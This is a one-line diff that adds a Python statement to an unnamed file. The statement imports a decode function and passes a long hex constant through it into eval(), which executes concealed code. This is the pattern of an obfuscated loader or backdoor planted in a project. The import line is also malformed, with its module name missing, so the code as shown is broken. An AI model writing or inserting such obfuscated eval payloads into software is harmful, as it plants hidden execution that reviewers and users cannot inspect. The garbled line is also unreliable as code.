@@ -1,0 +1,1 @@
+from  import decode as dec;eval(dec(0x245f4e8522df88eff6bc2195fe1fffcc995ec051f83b5adb65b77fc06ed18ce444522b09c6a2a785ffd61c8b389077ecf6))
